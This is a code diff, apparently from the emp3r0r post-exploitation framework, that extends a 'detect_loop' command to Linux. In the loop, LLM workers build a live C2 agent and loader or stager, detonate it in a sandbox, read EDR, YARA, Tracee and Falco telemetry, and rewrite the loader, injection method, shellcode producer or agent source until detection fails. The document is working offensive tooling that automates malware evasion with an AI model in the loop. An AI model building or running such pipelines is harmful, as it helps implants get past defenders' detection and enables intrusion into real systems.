@@ -50,30 +50,45 @@ func detectLoopCmd() *cobra.Command {
 	cmd := &cobra.Command{
 		Use:     "detect_loop",
 		GroupID: "agent",
-		Short:   "Autonomously build, detonate, edit, and re-test loader_windows with Norma",
-		Long: `Start the autonomous detection loop for loader_windows.
+		Short:   "Autonomously build, detonate, edit, and re-test a payload with Norma",
+		Long: `Start the autonomous detection loop for loader_windows or stager_linux.
 
-The command generates a real Go Windows agent shellcode when --shellcode is
-omitted, then starts the loop. The loop builds the loader from --module-dir,
-detonates it in LitterBox, and runs three Norma workers: a planner that chooses
-one mechanism and prediction, an editor that applies every source or producer
-edit the change needs and detonates one cycle, and a debugger that inspects the
-sandbox guest when the payload did not execute. Agent generation and C2
-verification use the console's existing connection.
+The command generates a real agent when --shellcode is omitted, then starts the
+loop. For loader_windows it builds a Go Windows agent and wraps it with a
+shellcode producer; for stager_linux it builds the C agent PIC from the editable
+c_agent tree and embeds it in an executable stager. The loop builds the module
+from --module-dir, detonates it in LitterBox (Windows) or PenguinBox (Linux), and
+runs three Norma workers: a planner that chooses one mechanism and prediction,
+an editor that applies every source or producer edit the change needs and
+detonates one cycle, and a debugger that inspects the sandbox when the payload
+did not execute. Agent generation and C2 verification use the console's
+existing connection.
 
---shellcode accepts any x64 position-independent shellcode. Without it, the
-loop generates a Windows EXE agent and wraps it with donut. Pass
---agent-type windows_dll to build a DLL agent instead; it is wrapped with
-crystal_pack when the Crystal Palace distribution, Java, and its build
-toolchain are installed, and with donut otherwise. Norma can
-change the loader, wrapper, injection path, or shellcode producer when telemetry
-points at that design.
+Select the Linux payload with --module stager_linux and a --module-dir that
+points at core/modules/stager_linux. The C agent source defaults to the sibling
+core/c_agent and is a writable source root. The Linux sandbox API is the
+LitterBox-compatible PenguinBox endpoint; point --sandbox at the SSH tunnel, for
+example 127.0.0.1:1338, and set --cc to an address the guest can reach
+(10.0.2.2 reaches the operator host through QEMU user networking). Linux always
+uses the shipped malasada module; --producer paths are Windows-only. It does
+not use the Windows guest-SSH debugger.
+
+--shellcode accepts any x64 position-independent shellcode for loader_windows,
+or the C agent PIC for stager_linux. Without it, the loop generates the matching
+agent. For a Windows EXE it wraps with donut. Pass --agent-type windows_dll to
+build a DLL agent instead; it is wrapped with crystal_pack when the Crystal
+Palace distribution, Java, and its build toolchain are installed, and with donut
+otherwise. A Linux loop always uses --agent-type linux_so. Norma can
+change the loader, wrapper, injection path, Windows shellcode producer, stager,
+or C agent when telemetry points at that design.
 
 The loop imports every saved LitterBox analyzer result: RedEdr, Moneta,
 pe-sieve, HollowsHunter, HSB, Patriot, Blender, YARA, CheckPlz, HolyGrail, and
-every EDR profile. Full feedback, builds, and per-payload telemetry stay in
-SQLite. The loop writes only its instructions and bounded tool results to the
-model context.
+every EDR profile. A PenguinBox result is imported as Tracee syscall/LSM events
+and Falco alerts, with ELF and YARA static findings. Full feedback, builds, and
+per-payload telemetry stay in one SQLite store, tagged with the trace platform.
+The loop writes only its instructions and bounded tool results to the model
+context.
 
 Enable the debugger with --guest-ssh user@host:port and --guest-ssh-key. There
 is no implicit host. The debugger uses public-key SSH into the sandbox guest,
@@ -114,7 +129,7 @@ Set the model through the environment:
   EMP3R0R_DETECTION_MODEL=<model>
   EMP3R0R_DETECTION_BASE_URL=<url>
   OPENAI_API_KEY=<key>`,
-		Example: "detect_loop --module-dir /path/to/core/modules/loader_windows --iterations 3",
+		Example: "detect_loop --module loader_windows --module-dir /path/to/core/modules/loader_windows --iterations 3\n  detect_loop --module stager_linux --module-dir /path/to/core/modules/stager_linux --sandbox 127.0.0.1:1338 --cc 10.0.2.2",
 		Args:    cobra.NoArgs,
 		Run:     runDetectLoopCommand,
 	}
@@ -133,19 +148,21 @@ Set the model through the environment:
 // addDetectLoopFlags registers the build/detonation options shared by
 // `detect_loop` and its explicit `start` alias.
 func addDetectLoopFlags(cmd *cobra.Command) {
-	cmd.Flags().String("module-dir", "", "Module source directory (default: the installed loader_windows path)")
-	cmd.Flags().String("shellcode", "", "x64 PIC shellcode (Donut, Crystal Palace PICO, ...); generated when omitted")
-	cmd.Flags().String("agent-type", "auto", "Agent payload type to generate: auto, windows_executable, or windows_dll")
+	cmd.Flags().String("module", "", "Payload module: loader_windows or stager_linux (default: derived from --module-dir, else loader_windows)")
+	cmd.Flags().String("module-dir", "", "Module source directory (default: the installed module path)")
+	cmd.Flags().String("agent-source-dir", "", "Editable C agent source for stager_linux (default: <repo>/c_agent)")
+	cmd.Flags().String("shellcode", "", "Windows x64 PIC shellcode or the Linux C agent PIC; generated when omitted")
+	cmd.Flags().String("agent-type", "auto", "Agent payload type: auto, windows_executable, windows_dll, or linux_so")
 	cmd.Flags().String("arch", "amd64", "Agent architecture")
 	cmd.Flags().String("cc", "", "C2 address for the generated agent; defaults to the configured address and is used verbatim")
 	cmd.Flags().String("sandbox", "", "LitterBox URL; defaults to EMP3R0R_DETECTION_SANDBOX or 127.0.0.1:1337")
 	cmd.Flags().Int("iterations", 3, "Maximum detection cycles across attempts, including each baseline")
 	cmd.Flags().StringSlice("stages", []string{"static", "dynamic"}, "Stages to run: static, dynamic, edr")
 	cmd.Flags().String("process", "", "Override the sacrificial process; empty uses the module default")
-	cmd.Flags().String("format", "exe", "Loader host format: exe, service, or dll")
+	cmd.Flags().String("format", "exe", "Windows loader host format: exe, service, or dll; stager_linux always builds an executable")
 	cmd.Flags().String("inject", "", "Override the injection method; empty uses the module default")
 	cmd.Flags().String("smw", "on", "SilentMoonwalk: on or off")
-	cmd.Flags().StringSlice("producer", nil, "Shellcode producer as name or name=path (donut, crystal_pack, donut=/path); a bare name uses the installed module; the baseline uses the installed producers")
+	cmd.Flags().StringSlice("producer", nil, "Shellcode producer as name or name=path (donut, crystal_pack, malasada, name=/path); a bare name uses the installed module")
 	cmd.Flags().StringSlice("read-root", nil, "Read-only source root the model may inspect (repeatable)")
 	cmd.Flags().String("knowledge", "", "Knowledge cache path; defaults to <detection store>/knowledge.db")
 	cmd.Flags().Int("turns", 60, "Default per-worker turn cap; overridden by the role flags")
@@ -181,13 +198,15 @@ func addDetectLoopFlags(cmd *cobra.Command) {
 
 	_ = cmd.RegisterFlagCompletionFunc("inject", completeFlagValues("apc", "ct", "self"))
 	_ = cmd.RegisterFlagCompletionFunc("format", completeFlagValues("exe", "service", "dll"))
-	_ = cmd.RegisterFlagCompletionFunc("agent-type", completeFlagValues("auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL))
+	_ = cmd.RegisterFlagCompletionFunc("agent-type", completeFlagValues("auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL, "linux_so"))
 	_ = cmd.RegisterFlagCompletionFunc("arch", completeFlagValues("amd64"))
 	_ = cmd.RegisterFlagCompletionFunc("smw", completeFlagValues("on", "off"))
 	_ = cmd.RegisterFlagCompletionFunc("stages", completeFlagValues("static", "dynamic"))
 	_ = cmd.RegisterFlagCompletionFunc("debugger-policy", completeFlagValues("final", "cycle", "off"))
 	_ = cmd.RegisterFlagCompletionFunc("process", completeFlagValues("dllhost.exe", "notepad.exe", "svchost.exe", "explorer.exe", "rundll32.exe"))
 	_ = cmd.RegisterFlagCompletionFunc("producer", completeFlagValues("donut", "crystal_pack"))
+	_ = cmd.RegisterFlagCompletionFunc("module", completeFlagValues("loader_windows", "stager_linux"))
+	_ = cmd.RegisterFlagCompletionFunc("agent-source-dir", completeFlagDirs)
 	_ = cmd.RegisterFlagCompletionFunc("module-dir", completeFlagDirs)
 	_ = cmd.RegisterFlagCompletionFunc("read-root", completeFlagDirs)
 	_ = cmd.RegisterFlagCompletionFunc("shellcode", completeFlagFiles)
@@ -291,6 +310,19 @@ func detectLoopResumeCmd() *cobra.Command {
 			opts := manifest.Options
 			if opts.Iterations <= 0 {
 				opts.Iterations = 3
+			}
+			if opts.Module == "" {
+				opts.Module = filepath.Base(filepath.Clean(opts.ModuleDir))
+			}
+			opts.Module = strings.ToLower(strings.TrimSpace(opts.Module))
+			opts.Platform = detection.PlatformForModule(opts.Module)
+			if opts.Platform == "linux" {
+				if opts.AgentSourceDir == "" {
+					opts.AgentSourceDir = detection.DefaultAgentSourceDir(opts.ModuleDir)
+				}
+				opts.AgentType = "linux_so"
+			} else if opts.AgentType == "" || opts.AgentType == "auto" {
+				opts.AgentType = "windows_executable"
 			}
 			if strings.TrimSpace(opts.ModuleDir) == "" {
 				logging.Errorf("detect_loop resume: the saved loop has no module directory")
@@ -473,8 +505,11 @@ sandbox run, so use detect_loop stop for immediate termination.`,
 }
 
 type detectLoopOptions struct {
-	ModuleDir string
-	Shellcode string
+	Module         string
+	ModuleDir      string
+	Platform       string
+	AgentSourceDir string
+	Shellcode      string
 	// AgentArtifact is the agent executable or DLL wrapped into Shellcode.
 	// The loop deletes it when it rotates the test agent.
 	AgentArtifact string
@@ -541,7 +576,9 @@ func runDetectLoopCommand(cmd *cobra.Command, _ []string) {
 		logging.Infof("detect_loop: loaded %d operator env values", loaded)
 	}
 	opts := detectLoopOptions{}
+	opts.Module, _ = cmd.Flags().GetString("module")
 	opts.ModuleDir, _ = cmd.Flags().GetString("module-dir")
+	opts.AgentSourceDir, _ = cmd.Flags().GetString("agent-source-dir")
 	opts.Shellcode, _ = cmd.Flags().GetString("shellcode")
 	opts.AgentType, _ = cmd.Flags().GetString("agent-type")
 	opts.Arch, _ = cmd.Flags().GetString("arch")
@@ -590,18 +627,49 @@ func runDetectLoopCommand(cmd *cobra.Command, _ []string) {
 		opts.CC = strings.TrimSpace(live.GetRuntimeConfig().CCAddress)
 	}
 
+	if opts.ModuleDir == "" {
+		module := strings.TrimSpace(opts.Module)
+		if module == "" {
+			module = "loader_windows"
+		}
+		if mod, ok := def.GetModule(module); ok && mod != nil {
+			opts.ModuleDir = mod.Path
+		}
+	}
+	if opts.Module == "" && opts.ModuleDir != "" {
+		opts.Module = filepath.Base(filepath.Clean(opts.ModuleDir))
+	}
+	opts.Module = strings.ToLower(strings.TrimSpace(opts.Module))
+	if opts.Module == "" {
+		opts.Module = "loader_windows"
+	}
+	if !detection.Covered(opts.Module) {
+		logging.Errorf("detect_loop: module must be loader_windows or stager_linux")
+		return
+	}
+	opts.Platform = detection.PlatformForModule(opts.Module)
 	if opts.AgentType = strings.ToLower(strings.TrimSpace(opts.AgentType)); opts.AgentType == "" {
 		opts.AgentType = "auto"
 	}
-	switch opts.AgentType {
-	case "auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL:
-	default:
-		logging.Errorf("detect_loop: agent type must be auto, %s, or %s",
-			builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL)
-		return
+	if opts.Platform == "linux" {
+		switch opts.AgentType {
+		case "auto", "linux_so", "linux_shellcode":
+			opts.AgentType = "linux_so"
+		default:
+			logging.Errorf("detect_loop: stager_linux uses agent type linux_so")
+			return
+		}
+	} else {
+		switch opts.AgentType {
+		case "auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL:
+		default:
+			logging.Errorf("detect_loop: agent type must be auto, %s, or %s",
+				builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL)
+			return
+		}
 	}
 	if opts.Arch != "amd64" {
-		logging.Errorf("detect_loop: loader_windows is built for amd64; use --arch amd64")
+		logging.Errorf("detect_loop: this payload is built for amd64; use --arch amd64")
 		return
 	}
 	switch policy := strings.ToLower(strings.TrimSpace(opts.DebuggerPolicy)); policy {
@@ -614,23 +682,41 @@ func runDetectLoopCommand(cmd *cobra.Command, _ []string) {
 		return
 	}
 	if opts.ModuleDir == "" {
-		if mod, ok := def.GetModule("loader_windows"); ok && mod != nil {
-			opts.ModuleDir = mod.Path
-		}
-	}
-	if opts.ModuleDir == "" {
-		logging.Errorf("detect_loop: pass --module-dir or install loader_windows")
+		logging.Errorf("detect_loop: pass --module-dir or install %s", opts.Module)
 		return
 	}
 	if info, err := os.Stat(opts.ModuleDir); err != nil || !info.IsDir() {
 		logging.Errorf("detect_loop: module directory %q is not readable", opts.ModuleDir)
 		return
 	}
-	// Expose the installed shellcode producers by default. The model may tune
-	// them and rebuild the shellcode through BuildShellcode.
-	if len(opts.Producers) == 0 {
-		for name, dir := range detection.DefaultProducerDirs() {
-			opts.Producers = append(opts.Producers, name+"="+dir)
+	if opts.Platform == "linux" {
+		if opts.AgentSourceDir == "" {
+			opts.AgentSourceDir = detection.DefaultAgentSourceDir(opts.ModuleDir)
+		}
+		opts.AgentSourceDir = detection.ExpandHomePath(opts.AgentSourceDir)
+		if info, err := os.Stat(opts.AgentSourceDir); err != nil || !info.IsDir() {
+			logging.Errorf("detect_loop: C agent source directory %q is not readable", opts.AgentSourceDir)
+			return
+		}
+		if len(opts.Producers) > 0 {
+			logging.Errorf("detect_loop: stager_linux always uses the shipped malasada producer; remove --producer")
+			return
+		}
+		malasadaDir := detection.LinuxProducerDir(opts.ModuleDir)
+		if malasadaDir == "" {
+			logging.Errorf("detect_loop: the shipped malasada producer was not found; install the operator kit")
+			return
+		}
+		opts.Producers = []string{"malasada=" + malasadaDir}
+	} else {
+		if opts.AgentSourceDir != "" {
+			logging.Errorf("detect_loop: --agent-source-dir is only used by stager_linux")
+			return
+		}
+		if len(opts.Producers) == 0 {
+			for name, dir := range detection.DefaultProducerDirs() {
+				opts.Producers = append(opts.Producers, name+"="+dir)
+			}
 		}
 	}
 	// The loader links shared sources outside its own directory; make them
@@ -755,6 +841,9 @@ func parseGuestSSHEndpoint(value string) (user, host string, port int, err error
 }
 
 func generateAgentShellcode(opts detectLoopOptions, logf func(string, ...any)) (shellcode, agentArtifact, producer, agentType, agentUUID string, err error) {
+	if opts.Platform == "linux" {
+		return generateLinuxAgentShellcode(opts, logf)
+	}
 	producers, err := detection.ParseProducerDirs(opts.Producers)
 	if err != nil {
 		return "", "", "", "", "", err
@@ -803,6 +892,67 @@ func generateAgentShellcode(opts detectLoopOptions, logf func(string, ...any)) (
 		return "", "", "", "", "", fmt.Errorf("%s producer did not report a generated payload", producer)
 	}
 	return payloads[len(payloads)-1].Path, result.OutputFile, producer, agentType, result.AgentUUID, nil
+}
+
+// generateLinuxAgentShellcode builds the C agent PIC that stager_linux embeds.
+// The source tree is the same writable c_agent root the model edits.
+func generateLinuxAgentShellcode(opts detectLoopOptions, logf func(string, ...any)) (shellcode, agentArtifact, producer, agentType, agentUUID string, err error) {
+	sourceDir := strings.TrimSpace(opts.AgentSourceDir)
+	if sourceDir == "" {
+		sourceDir = detection.DefaultAgentSourceDir(opts.ModuleDir)
+	}
+	agentCfg := builder.AgentConfig{IsStager: true}
+	if strings.TrimSpace(opts.CC) != "" {
+		cc := strings.TrimSpace(opts.CC)
+		agentCfg.CCAddress = &cc
+	}
+	providers := builder.CAgentProviders{Format: "so", Arch: opts.Arch, Libc: "glibc"}
+	logf("C agent source: %s", sourceDir)
+	generationMu.Lock()
+	result, err := builder.GenerateCAgentWorkflowAt(sourceDir, agentCfg, providers, client.SignAgent)
+	if err != nil {
+		logf("signed C agent generation failed (%v); building without a C2 signature", err)
+		result, err = builder.GenerateCAgentWorkflowAt(sourceDir, agentCfg, providers, nil)
+	}
+	generationMu.Unlock()
+	if err != nil {
+		return "", "", "", "", "", err
+	}
+	if result == nil || strings.TrimSpace(result.OutputFile) == "" {
+		return "", "", "", "", "", fmt.Errorf("C agent build produced no artifact")
+	}
+	pic, err := buildMalasadaShellcode(opts, result.OutputFile, result.AgentUUID, logf)
+	if err != nil {
+		return "", "", "", "", "", err
+	}
+	return pic, result.OutputFile, "malasada", "linux_so", result.AgentUUID, nil
+}
+
+// buildMalasadaShellcode runs the installed malasada module on a C agent
+// shared object. The module builds from its editable source, so a source edit
+// changes the next blob.
+func buildMalasadaShellcode(opts detectLoopOptions, soPath, agentUUID string, logf func(string, ...any)) (string, error) {
+	dir := detection.LinuxProducerDir(opts.ModuleDir)
+	if dir == "" {
+		return "", fmt.Errorf("the shipped malasada producer was not found; install the operator kit")
+	}
+	outDir := filepath.Join(live.EmpWorkSpace, "detection", "shellcode")
+	if err := os.MkdirAll(outDir, 0o700); err != nil {
+		return "", fmt.Errorf("create shellcode directory: %w", err)
+	}
+	output := filepath.Join(outDir, "malasada-"+strings.TrimSpace(agentUUID)+".bin")
+	logf("malasada producer: %s -> %s", soPath, output)
+	buildLog, err := modules.BuildLocalModuleAt(dir, "malasada", map[string]string{
+		"input": soPath, "output": output, "call-export": "main", "compress": "on",
+	})
+	if err != nil {
+		return "", fmt.Errorf("malasada producer: %w\n%s", err, lastLogLines(buildLog, 20))
+	}
+	payloads := detection.ParseGeneratedPayloads(buildLog)
+	if len(payloads) == 0 {
+		return "", fmt.Errorf("malasada producer did not report a generated payload")
+	}
+	return payloads[len(payloads)-1].Path, nil
 }
 
 // chooseShellcodeProducer maps an agent type to a producer: donut wraps a
